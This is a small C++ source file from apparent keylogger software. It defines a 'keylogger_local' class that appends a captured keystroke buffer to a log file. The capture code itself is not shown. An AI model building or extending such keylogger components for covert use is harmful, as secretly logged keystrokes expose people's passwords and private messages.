#include "./keylogger_local.hpp"

keylogger_local::keylogger_local() : keylogger()
{
	a_ofstream = new ofstream();
}

keylogger_local::~keylogger_local()
{
	a_ofstream->close();

	delete a_ofstream;
}

void keylogger_local::initialize(string p_file_name)
{
	a_ofstream->open(p_file_name.c_str(), std::ofstream::app);
}

void keylogger_local::save()
{
	*a_ofstream << *a_buffer << endl;

	a_ofstream->flush();

	a_buffer->clear();
}
